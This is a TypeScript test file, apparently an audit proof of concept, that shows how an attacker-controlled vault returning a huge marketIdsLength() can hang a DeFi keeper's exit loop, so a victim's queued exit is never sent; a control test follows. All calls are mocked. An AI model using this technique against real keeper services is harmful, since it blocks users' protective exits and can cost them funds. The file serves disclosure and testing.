// PoC-3: one attacker-controlled vault hangs the keeper's exit loop, so no other exit is ever sent.
// Copy into run/services/test/ and run: bun test test/poc-keeper-hang.test.ts
import { beforeEach, expect, test } from "bun:test";
import type { Address, Hex } from "viem";
import { drainExits, type ExitJob, type KeeperDeps } from "../src/keeper/keeper";
import { repo, type Repo } from "../src/store/repo";
import { freshDb } from "./db";

const X = "0x00000000000000000000000000000000000000e1" as Address; // attacker's own "vault" (any contract; ERC4626Adapter.positionAsset accepts any target)
const ADAPTER = "0x00000000000000000000000000000000000000e2" as Address; // attacker's fake liquidity adapter
const V = "0x00000000000000000000000000000000000000c3" as Address; // a real vault with a victim's position
const ROUTER = "0x00000000000000000000000000000000000000b0" as Address;
const KEEPER = "0x00000000000000000000000000000000000000a0" as Address;
const TOKEN = "0x00000000000000000000000000000000000000d4" as Address;

let r: Repo;
let LEN = 2n ** 255n;
beforeEach(async () => {
  r = repo(await freshDb());
});

test("attacker vault returning a huge marketIdsLength() keeps drainExits busy forever; the victim exit is never sent", async () => {
  let reads = 0;
  const sentTo: string[] = [];
  const client = {
    readContract: async ({ address, functionName }: { address: Address; functionName: string }) => {
      reads++;
      await Bun.sleep(0); // stand-in for an RPC round trip
      switch (functionName) {
        case "balanceOf": return 100n; // attacker reports shares for itself
        case "allowance": return 100n;
        case "asset": return TOKEN;
        case "liquidityAdapter": if (address === X) return ADAPTER; throw new Error("not v2");
        case "forceDeallocatePenalty": return 0n;
        case "marketIdsLength": return LEN; // keeper/liquidity.ts:31 trusts this as a loop bound
        case "marketIds": return `0x${"77".repeat(32)}`;
        case "market": return [0n, 0n, 0n, 0n, 0n, 0n]; // real Morpho returns zeros for an unknown id
        case "position": return [0n, 0n, 0n];
        default: throw new Error(functionName);
      }
    },
    simulateCalls: async () => { throw new Error("never reached for X"); },
  };
  const d = {
    client, repo: r, router: ROUTER, alarmBook: ROUTER, multicall3: ROUTER, morpho: ROUTER, account: KEEPER, now: () => 1_000,
    paidOnly: true, // the attacker holds a 15-unit plan; onFired then queues its job like any other
    send: async (tx: { to: string }) => { sentTo.push(tx.to); return `0x${"11".repeat(32)}` as Hex; },
  } as unknown as KeeperDeps;

  const attackerJob: ExitJob = { posId: `0x${"01".repeat(32)}`, key: `0x${"a1".repeat(32)}`, owner: KEEPER, target: X, firedAt: 990 };
  const victimJob: ExitJob = { posId: `0x${"02".repeat(32)}`, key: `0x${"b2".repeat(32)}`, owner: KEEPER, target: V, firedAt: 995 };
  await r.enqueue("exit", "attacker", attackerJob, 990); // due first
  await r.enqueue("exit", "victim", victimJob, 995);

  const outcome = await Promise.race([drainExits(d).then(() => "finished"), Bun.sleep(3_000).then(() => "still running")]);
  console.log(`PoC-3: after 3 s drainExits is ${outcome}; ${reads} RPC reads made; sends: ${sentTo.length}`);
  expect(outcome).toBe("still running");
  expect(reads).toBeGreaterThan(300);
  expect(sentTo).toEqual([]); // the victim's exit was never attempted
}, 10_000);

test("control: with a sane marketIdsLength() the same pass finishes", async () => {
  LEN = 1n;
  const client = {
    readContract: async ({ address, functionName }: { address: Address; functionName: string }) => {
      switch (functionName) {
        case "balanceOf": case "allowance": return 100n;
        case "asset": return TOKEN;
        case "liquidityAdapter": if (address === X) return ADAPTER; throw new Error("not v2");
        case "forceDeallocatePenalty": return 0n;
        case "marketIdsLength": return LEN;
        case "marketIds": return `0x${"77".repeat(32)}`;
        case "market": return [0n, 0n, 0n, 0n, 0n, 0n];
        case "position": return [0n, 0n, 0n];
        default: throw new Error(functionName);
      }
    },
    simulateCalls: async () => { throw new Error("sim"); },
  };
  const d = { client, repo: r, router: ROUTER, alarmBook: ROUTER, multicall3: ROUTER, morpho: ROUTER, account: KEEPER, now: () => 1_000, paidOnly: true,
    send: async () => `0x${"11".repeat(32)}` as Hex } as unknown as KeeperDeps;
  await r.enqueue("exit", "attacker", { posId: `0x${"01".repeat(32)}`, key: `0x${"a1".repeat(32)}`, owner: KEEPER, target: X, firedAt: 990 }, 990);
  await r.enqueue("exit", "victim", { posId: `0x${"02".repeat(32)}`, key: `0x${"b2".repeat(32)}`, owner: KEEPER, target: V, firedAt: 995 }, 995);
  const outcome = await Promise.race([drainExits(d).then(() => "finished"), Bun.sleep(3_000).then(() => "still running")]);
  expect(outcome).toBe("finished");
});
